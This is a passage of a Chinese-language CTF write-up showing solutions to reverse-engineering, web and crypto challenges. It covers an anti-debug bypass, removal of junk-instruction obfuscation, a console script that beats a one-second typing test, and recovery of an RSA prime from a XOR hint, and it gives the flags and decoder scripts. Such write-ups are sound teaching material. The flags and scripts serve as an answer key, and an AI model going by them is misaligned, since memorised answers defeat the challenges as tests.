class="symbol">.text:</span>00007FF670C22CD8                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_10E], <span class="number">79h</span> <span class="comment">; &#x27;y&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CDF                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_10D], <span class="number">32h</span> <span class="comment">; &#x27;2&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CE6                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_10C], <span class="number">2Eh</span> <span class="comment">; &#x27;.&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CED                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_10B], <span class="number">6Ch</span> <span class="comment">; &#x27;l&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CF4                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_10A], <span class="number">23h</span> <span class="comment">; &#x27;#&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CFB                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_109], <span class="number">7Bh</span> <span class="comment">; &#x27;&#123;&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22D02                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_EC], <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22D0C                 <span class="keyword">jmp</span>     short loc_7FF670C22D1C</span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22D0E <span class="comment">; ---------------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure>
<p>进行异或，即条件判定已修改完成，绕过了反调试机制，接着进行动态调试，退出前发现key已经变为<font color=lime><strong>[0x05, 0x0D, 0x0F, 0x47, 0x02, 0x02, 0x0C, 0x7F, 0x22, 0x5A,  0x0C,0x11, 0x47, 0x0A, 0x56, 0x52, 0x3C, 0x0C, 0x0F, 0x59, 0x26, 0x5E, 0x06, 0x7F, 0x04, 0x08, 0x00, 0x0A, 0x45, 0x09, 0x5A, 0x42]</strong></font>，将flag与key进行异或，得到<font color=deepskyblue><strong>flag{my_D3bugg3r_may_1s_banned?}</strong></font>.代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">  flag[i] ^= key[i]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(d) <span class="keyword">for</span> d <span class="keyword">in</span> flag))</span><br></pre></td></tr></table></figure>

<h3 id="Dirty-flowers："><a href="#Dirty-flowers：" class="headerlink" title="Dirty flowers："></a>Dirty flowers：</h3><p>反编译后发现程序内有花指令混淆了某些基本函数，找到程序内部有以下提示：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.rdata:</span>00B83118 Format <span class="built_in">db</span> <span class="string">&#x27;Please first master basic x86 assembly knowledge&#x27;</span>,<span class="number">0Ah</span>,<span class="number">0</span></span><br><span class="line"><span class="symbol">.rdata:</span>00B83150 aThisProgramWil <span class="built_in">db</span> <span class="string">&#x27;This program will teach you a relatively simple method to remove &#x27;</span></span><br><span class="line"><span class="symbol">.rdata:</span>00B83191 <span class="built_in">db</span> <span class="string">&#x27;flower commands&#x27;</span>,<span class="number">0Ah</span>,<span class="number">0</span></span><br><span class="line"><span class="symbol">.rdata:</span>00B831A8 aIfYouCannotDis <span class="built_in">db</span> <span class="string">&#x27;If you cannot distinguish the flower instruction of this program,&#x27;</span></span><br><span class="line"><span class="symbol">.rdata:</span>00B831E9 <span class="built_in">db</span> <span class="string">&#x27; please focus mainly on the &#x27;</span>,<span class="number">27h</span>,<span class="string">&#x27;call $ + 5&#x27;</span>,<span class="number">27h</span>,<span class="string">&#x27; and &#x27;</span>,<span class="number">27h</span>,<span class="string">&#x27;r&#x27;</span></span><br><span class="line"><span class="symbol">.rdata:</span>00B83218 <span class="built_in">db</span> <span class="string">&#x27;etn&#x27;</span>,<span class="number">27h</span>,<span class="string">&#x27; instructions&#x27;</span>,<span class="number">0Ah</span>,<span class="number">0</span></span><br><span class="line"><span class="symbol">.rdata:</span>00B83230 aIfYouStillDonT <span class="built_in">db</span> <span class="string">&#x27;If you still don&#x27;</span>,<span class="number">27h</span>,<span class="string">&#x27;t understand how to remove it, you can cha&#x27;</span></span><br><span class="line"><span class="symbol">.rdata:</span>00B8326B <span class="built_in">db</span> <span class="string">&#x27;nge all the instructions in the 0x004012F1-0x00401302 section to &#x27;</span></span><br><span class="line"><span class="symbol">.rdata:</span>00B832AC <span class="built_in">db</span> <span class="string">&#x27;nop instructions.Then press U and then P at the position of the f&#x27;</span></span><br><span class="line"><span class="symbol">.rdata:</span>00B832ED <span class="built_in">db</span> <span class="string">&#x27;unction head.&#x27;</span>,<span class="number">0Ah</span>,<span class="number">0</span></span><br><span class="line"><span class="symbol">.rdata:</span>00B832FC aNowEnterTheFla <span class="built_in">db</span> <span class="string">&#x27;Now enter the flag you have obtained:&#x27;</span>,<span class="number">0Ah</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>接下来就是检测flag，反编译main会发现main执行后会自动跳转到这里（用汇编语言继续执行？），根据提示将对应的函数全部改成nop（无操作），再进行断点调试运行，发现机制是先检测位数是否符合要求，如果不符合要求直接以错误的长度退出，长度符合要求再进行字符上的比较，在反汇编代码中找到检测输入部分：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00B81321 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">1004h</span>] <span class="comment">; （用户输入存储在 [ebp-1004h] 中）</span></span><br><span class="line"><span class="symbol">.text:</span>00B81327 <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>00B81328 <span class="keyword">push</span>    offset aS        <span class="comment">; &quot;%s&quot;</span></span><br><span class="line"><span class="symbol">.text:</span>00B8132D <span class="keyword">call</span>    sub_B810C0</span><br><span class="line"><span class="symbol">.text:</span>00B81332 <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">8</span></span><br></pre></td></tr></table></figure>
<p>和比较长度部分：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00B8138C <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">1010h</span>], <span class="number">24h</span> <span class="comment">; &#x27;$&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00B81393 <span class="keyword">jz</span>      short loc_B813A6	     <span class="comment">; 长度符合要求直接跳转到00B813A6</span></span><br><span class="line"><span class="symbol">.text:</span>00B81395 <span class="keyword">push</span>    offset aWrongLength        <span class="comment">; &quot;wrong length!\n&quot;</span></span><br></pre></td></tr></table></figure>
<p>发现所需长度是0x24（也就是36位），再观察下方符合长度要求时进一步的检测：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00B813A6 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>00B813A6</span><br><span class="line"><span class="symbol">.text:</span>00B813A6 loc_B813A6:                             <span class="comment">; CODE XREF: .text:00B81393↑j</span></span><br><span class="line"><span class="symbol">.text:</span>00B813A6                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>-<span class="number">1010h</span>] <span class="comment">; 输入长度（24h）存入ecx</span></span><br><span class="line"><span class="symbol">.text:</span>00B813AC                 <span class="keyword">push</span>    <span class="built_in">ecx</span>		  <span class="comment">; 将ecx压入栈中</span></span><br><span class="line"><span class="symbol">.text:</span>00B813AD                 <span class="keyword">lea</span>     <span class="built_in">edx</span>, [<span class="built_in">ebp</span>-<span class="number">1004h</span>] <span class="comment">; flag每个字符的具体值存入edx</span></span><br><span class="line"><span class="symbol">.text:</span>00B813B3                 <span class="keyword">push</span>    <span class="built_in">edx</span>		  <span class="comment">; 将edx压入栈中</span></span><br><span class="line"><span class="symbol">.text:</span>00B813B4                 <span class="keyword">call</span>    sub_B81100       <span class="comment">; 调用子函数 sub_B81100</span></span><br></pre></td></tr></table></figure>
<p>子函数sub_B81100反编译：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sub_B81100</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v0[<span class="number">16</span>]; <span class="comment">// [esp+24h] [ebp-14h] BYREF //v0是一个长度为16 的字符数组，用于存储字符串</span></span><br><span class="line">  <span class="built_in">strcpy</span>(v0, <span class="string">&quot;dirty_flower&quot;</span>); <span class="comment">//使用strcpy将字符串&quot;dirty_flower&quot;复制到v0中</span></span><br><span class="line">  <span class="built_in">strlen</span>(v0);<span class="comment">//使用strlen计算v0中字符串的长度</span></span><br><span class="line">  JUMPOUT(<span class="number">0xB81177</span>); <span class="comment">//跳转到0xB81177</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>0xB81177部分：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00B81177</span><br><span class="line"><span class="symbol">.text:</span>00B81177 loc_B81177:                             <span class="comment">; DATA XREF: sub_B81100+6C↑o</span></span><br><span class="line"><span class="symbol">.text:</span>00B81177                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">1Ch</span>], <span class="number">0</span> <span class="comment">;[ ebp-1Ch]改写为0</span></span><br><span class="line"><span class="symbol">.text:</span>00B8117E                 <span class="keyword">jmp</span>     short loc_B81189 <span class="comment">; 跳转到0xB81189</span></span><br></pre></td></tr></table></figure>
<p>0xB81189周围的循环：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00B81180 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>00B81180</span><br><span class="line"><span class="symbol">.text:</span>00B81180 loc_B81180:                             <span class="comment">; CODE XREF: .text:00B811B0↓j</span></span><br><span class="line"><span class="symbol">.text:</span>00B81180                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>-<span class="number">1Ch</span>]</span><br><span class="line"><span class="symbol">.text:</span>00B81183                 <span class="keyword">add</span>     <span class="built_in">ecx</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>00B81186                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>-<span class="number">1Ch</span>], <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>00B81189                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, [<span class="built_in">ebp</span>-<span class="number">1Ch</span>] 	<span class="comment">; 将0存入edx</span></span><br><span class="line"><span class="symbol">.text:</span>00B8118C                 <span class="keyword">cmp</span>     <span class="built_in">edx</span>, [<span class="built_in">ebp</span>+<span class="number">0Ch</span>]	<span class="comment">; 比较edx和[ebp+0Ch]</span></span><br><span class="line"><span class="symbol">.text:</span>00B8118F                 <span class="keyword">jge</span>     short loc_B811B2	<span class="comment">; 如果edx≥[ebp+0Ch]就跳转到0xB811B2（代表全部加密完成）</span></span><br><span class="line"><span class="symbol">.text:</span>00B81191                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">1Ch</span>]	<span class="comment">; 将0存入edx</span></span><br><span class="line"><span class="symbol">.text:</span>00B81194                 <span class="keyword">cdq</span></span><br><span class="line"><span class="symbol">.text:</span>00B81195                 <span class="keyword">idiv</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">2Ch</span>]</span><br><span class="line"><span class="symbol">.text:</span>00B81198                 <span class="keyword">movsx</span>   <span class="built_in">eax</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="built_in">edx</span>-<span class="number">14h</span>]</span><br><span class="line"><span class="symbol">.text:</span>00B8119D                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line"><span class="symbol">.text:</span>00B811A0                 <span class="keyword">add</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>-<span class="number">1Ch</span>]</span><br><span class="line"><span class="symbol">.text:</span>00B811A3                 <span class="keyword">movsx</span>   <span class="built_in">edx</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>]</span><br><span class="line"><span class="symbol">.text:</span>00B811A6                 <span class="keyword">xor</span>     <span class="built_in">edx</span>, <span class="built_in">eax</span>		<span class="comment">; 经过动态调试，发现这一步左侧是每个输入的字符，右侧是定值串dirty_flower构成的循环</span></span><br><span class="line"><span class="symbol">.text:</span>00B811A8                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line"><span class="symbol">.text:</span>00B811AB                 <span class="keyword">add</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">1Ch</span>]</span><br><span class="line"><span class="symbol">.text:</span>00B811AE                 <span class="keyword">mov</span>     [<span class="built_in">eax</span>], <span class="built_in">dl</span></span><br><span class="line"><span class="symbol">.text:</span>00B811B0                 <span class="keyword">jmp</span>     short loc_B81180	<span class="comment">; 回到循环</span></span><br></pre></td></tr></table></figure>
<p>子函数sub_B81100结束后：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00B813B9                 <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">8</span></span><br><span class="line"><span class="symbol">.text:</span>00B813BC                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">1010h</span>] <span class="comment">; 输入长度存入eax</span></span><br><span class="line"><span class="symbol">.text:</span>00B813C2                 <span class="keyword">push</span>    <span class="built_in">eax</span>		   <span class="comment">; 将eax压入栈中</span></span><br><span class="line"><span class="symbol">.text:</span>00B813C3                 <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>-<span class="number">1004h</span>] <span class="comment">; flag每个字符的具体值存入ecx中</span></span><br><span class="line"><span class="symbol">.text:</span>00B813C9                 <span class="keyword">push</span>    <span class="built_in">ecx</span>		   <span class="comment">; 将ecx压入栈中</span></span><br><span class="line"><span class="symbol">.text:</span>00B813CA                 <span class="keyword">call</span>    sub_B811D0       <span class="comment">; 调用子函数 sub_B811D0</span></span><br><span class="line"><span class="symbol">.text:</span>00B813CF                 <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">8</span></span><br><span class="line"><span class="symbol">.text:</span>00B813D2                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>         <span class="comment">; 检查sub_B811D0 的返回值是否为0</span></span><br><span class="line"><span class="symbol">.text:</span>00B813D4                 <span class="keyword">jz</span>      short loc_B813E5 <span class="comment">; 如果返回值为 0，跳转到 loc_B813E5（判输）</span></span><br><span class="line"><span class="symbol">.text:</span>00B813D6                 <span class="keyword">push</span>    offset aSuccess  <span class="comment">; &quot;success!\n&quot;</span></span><br><span class="line"><span class="symbol">.text:</span>00B813DB                 <span class="keyword">call</span>    sub_B81050</span><br><span class="line"><span class="symbol">.text:</span>00B813E0                 <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">4</span></span><br><span class="line"><span class="symbol">.text:</span>00B813E3                 <span class="keyword">jmp</span>     short loc_B813F2</span><br><span class="line"><span class="symbol">.text:</span>00B813E5 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>00B813E5</span><br><span class="line"><span class="symbol">.text:</span>00B813E5 loc_B813E5:                             <span class="comment">; CODE XREF: .text:00B813D4↑j</span></span><br><span class="line"><span class="symbol">.text:</span>00B813E5                 <span class="keyword">push</span>    offset aNo      <span class="comment">; &quot;no!\n&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在此基础上反编译sub_B811D0函数，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_B811D0</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+24h] [ebp-4h]</span></span><br><span class="line">  v3[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line">  v3[<span class="number">1</span>] = <span class="number">5</span>;</span><br><span class="line">  v3[<span class="number">2</span>] = <span class="number">19</span>;</span><br><span class="line">  v3[<span class="number">3</span>] = <span class="number">19</span>;</span><br><span class="line">  v3[<span class="number">4</span>] = <span class="number">2</span>;</span><br><span class="line">  v3[<span class="number">5</span>] = <span class="number">30</span>;</span><br><span class="line">  v3[<span class="number">6</span>] = <span class="number">83</span>;</span><br><span class="line">  v3[<span class="number">7</span>] = <span class="number">31</span>;</span><br><span class="line">  v3[<span class="number">8</span>] = <span class="number">92</span>;</span><br><span class="line">  v3[<span class="number">9</span>] = <span class="number">26</span>;</span><br><span class="line">  v3[<span class="number">10</span>] = <span class="number">39</span>;</span><br><span class="line">  v3[<span class="number">11</span>] = <span class="number">67</span>;</span><br><span class="line">  v3[<span class="number">12</span>] = <span class="number">29</span>;</span><br><span class="line">  v3[<span class="number">13</span>] = <span class="number">54</span>;</span><br><span class="line">  v3[<span class="number">14</span>] = <span class="number">67</span>;</span><br><span class="line">  v3[<span class="number">15</span>] = <span class="number">7</span>;</span><br><span class="line">  v3[<span class="number">16</span>] = <span class="number">38</span>;</span><br><span class="line">  v3[<span class="number">17</span>] = <span class="number">45</span>;</span><br><span class="line">  v3[<span class="number">18</span>] = <span class="number">85</span>;</span><br><span class="line">  v3[<span class="number">19</span>] = <span class="number">13</span>;</span><br><span class="line">  v3[<span class="number">20</span>] = <span class="number">3</span>;</span><br><span class="line">  v3[<span class="number">21</span>] = <span class="number">27</span>;</span><br><span class="line">  v3[<span class="number">22</span>] = <span class="number">28</span>;</span><br><span class="line">  v3[<span class="number">23</span>] = <span class="number">45</span>;</span><br><span class="line">  v3[<span class="number">24</span>] = <span class="number">2</span>;</span><br><span class="line">  v3[<span class="number">25</span>] = <span class="number">28</span>;</span><br><span class="line">  v3[<span class="number">26</span>] = <span class="number">28</span>;</span><br><span class="line">  v3[<span class="number">27</span>] = <span class="number">48</span>;</span><br><span class="line">  v3[<span class="number">28</span>] = <span class="number">56</span>;</span><br><span class="line">  v3[<span class="number">29</span>] = <span class="number">50</span>;</span><br><span class="line">  v3[<span class="number">30</span>] = <span class="number">85</span>;</span><br><span class="line">  v3[<span class="number">31</span>] = <span class="number">2</span>;</span><br><span class="line">  v3[<span class="number">32</span>] = <span class="number">27</span>;</span><br><span class="line">  v3[<span class="number">33</span>] = <span class="number">22</span>;</span><br><span class="line">  v3[<span class="number">34</span>] = <span class="number">84</span>;</span><br><span class="line">  v3[<span class="number">35</span>] = <span class="number">15</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)v3[i] != *(<span class="type">char</span> *)(i + a1) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>即输入与<font color=red><strong>dirty_flower</strong></font>循环异或后得到的结果与v3逐字符比对，若有不符的直接返回0，倒推得到flag：<font color=deepskyblue><strong>flag{A5s3mB1y_1s_r3ally_funDAm3nta1}</strong></font>.</p>
<p>代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">v3 = [<span class="number">2</span>, <span class="number">5</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">2</span>, <span class="number">30</span>, <span class="number">83</span>, <span class="number">31</span>, <span class="number">92</span>, <span class="number">26</span>, <span class="number">39</span>, <span class="number">67</span>, <span class="number">29</span>, <span class="number">54</span>, <span class="number">67</span>, <span class="number">7</span>, <span class="number">38</span>, <span class="number">45</span>, <span class="number">85</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">45</span>, <span class="number">2</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">48</span>, <span class="number">56</span>, <span class="number">50</span>, <span class="number">85</span>, <span class="number">2</span>, <span class="number">27</span>, <span class="number">22</span>, <span class="number">84</span>, <span class="number">15</span>]</span><br><span class="line">dirty_flower = [<span class="number">0x64</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">0x79</span>, <span class="number">0x5f</span>, <span class="number">0x66</span>, <span class="number">0x6c</span>, <span class="number">0x6f</span>, <span class="number">0x77</span>, <span class="number">0x65</span>, <span class="number">0x72</span>]</span><br><span class="line">flag_b = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v3)):</span><br><span class="line">    flag_gen = v3[i] ^ dirty_flower[i % <span class="built_in">len</span>(dirty_flower)]</span><br><span class="line">    flag_b.append(flag_gen)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(byte) <span class="keyword">for</span> byte <span class="keyword">in</span> flag_b)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h2 id="Web方向：-1"><a href="#Web方向：-1" class="headerlink" title="Web方向："></a>Web方向：</h2><h3 id="你能在一秒内打出八句英文吗："><a href="#你能在一秒内打出八句英文吗：" class="headerlink" title="你能在一秒内打出八句英文吗："></a>你能在一秒内打出八句英文吗：</h3><p>进入页面，发现右键、开发者菜单、复制粘贴等全部被禁用，下方有一个计时器，超出一秒就无法成功，再观察源代码，发现源代码第41行就是要输入的文本内容，形如<code>&lt;p id=&quot;text&quot;&gt;xxx&lt;/p&gt;</code>，于是选择使用JavaScript在控制台提交：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> textElement = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;text&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> sentences = textElement.<span class="property">textContent</span>;</span><br><span class="line"><span class="keyword">const</span> form = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;form&#x27;</span>);</span><br><span class="line">form.<span class="property">method</span> = <span class="string">&#x27;POST&#x27;</span>;</span><br><span class="line">form.<span class="property">action</span> = <span class="string">&#x27;/submit&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> input = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;input&#x27;</span>);</span><br><span class="line">input.<span class="property">type</span> = <span class="string">&#x27;hidden&#x27;</span>;</span><br><span class="line">input.<span class="property">name</span> = <span class="string">&#x27;user_input&#x27;</span>;</span><br><span class="line">input.<span class="property">value</span> = sentences;</span><br><span class="line">form.<span class="title function_">appendChild</span>(input);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(form);</span><br><span class="line">form.<span class="title function_">submit</span>();</span><br></pre></td></tr></table></figure>
<p>将代码提前复制粘贴到控制台，在按下按钮的瞬间迅速按enter即可在一秒内提交答案，得到flag：<font color=deepskyblue><strong>flag{70c3123f-1368-4b50-a6de-e10468333471}</strong></font>.</p>
<h2 id="Crypto方向：-1"><a href="#Crypto方向：-1" class="headerlink" title="Crypto方向："></a>Crypto方向：</h2><h3 id="这是几次方？疑惑！："><a href="#这是几次方？疑惑！：" class="headerlink" title="这是几次方？疑惑！："></a>这是几次方？疑惑！：</h3><p>^在计算机中并不表示次方（Pow）而是表示异或（谐音疑惑），下载py文件后得到另一个RSA加密，其中有e &#x3D; 65537，hint &#x3D; p^e + 10086，而异或的优先级低于加号，所以由提示的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint=12578819356802034679792891975754306960297043516674290901441811200649679289740456805726985390445432800908006773857670255951581884098015799603908242531673390</span><br></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p=hint^75623=12578819356802034679792891975754306960297043516674290901441811200649679289740456805726985390445432800908006773857670255951581884098015799603908242531598921</span><br></pre></td></tr></table></figure>
<p>从而计算出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q=9894080171409167477731048775117450997716595135307245061889351408996079284609420327696692120762586015707305237750670080746600707139163744385937564246995541</span><br></pre></td></tr></table></figure>
<p>用之前写的python工具得出</p>
